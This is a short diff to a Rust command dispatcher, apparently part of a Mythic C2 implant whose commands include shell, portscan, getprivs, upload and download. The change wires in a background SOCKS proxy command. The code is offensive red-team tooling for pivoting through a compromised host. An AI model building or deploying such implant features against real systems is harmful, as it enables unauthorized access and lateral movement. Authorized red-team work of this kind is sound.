@@ -10,7 +10,7 @@ use std::sync::{
 // Import all of the commands
 use crate::{
     cat, cd, cp, download, exit, getenv, getprivs, jobs, ls, mkdir, mv, netstat, portscan, ps, pwd,
-    redirect, rm, setenv, shell, sleep, ssh, unsetenv, upload, workinghours,
+    redirect, rm, setenv, shell, sleep, socks, ssh, unsetenv, upload, workinghours,
 };
 
 /// Struct which holds the information about background jobs
@@ -122,6 +122,13 @@ impl Tasker {
                         }
                         continue;
                     }
+                    "socks" => {
+                        if let Err(e) = self.spawn_background(task, socks::setup_socks, true) {
+                            self.completed_tasks
+                                .push(mythic_error!(task.id, e.to_string()));
+                        }
+                        continue;
+                    },
 
                     "ssh-spawn" => {
                         if let Err(e) =
